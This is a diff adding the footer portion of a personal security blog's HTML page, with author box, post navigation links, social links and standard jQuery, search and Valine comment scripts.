+      <div class="media-left">
+        <a href="https://github.com/lufeirider" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/lufeirider" target="_blank"><span class="text-dark">lufei</span><small class="ml-1x">网络安全</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2021/06/03/requests%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/" title="requests乱码问题"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2019/05/29/weblogic-2019-2725%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/" title="weblogic-2019-2725回显构造"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/lufeirider" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/lufeirider" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/lufeirider" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/lufeirider" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2021 lufei@湘ICP备17016147号-1
+        
+        <div class="publishby">
+        	
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
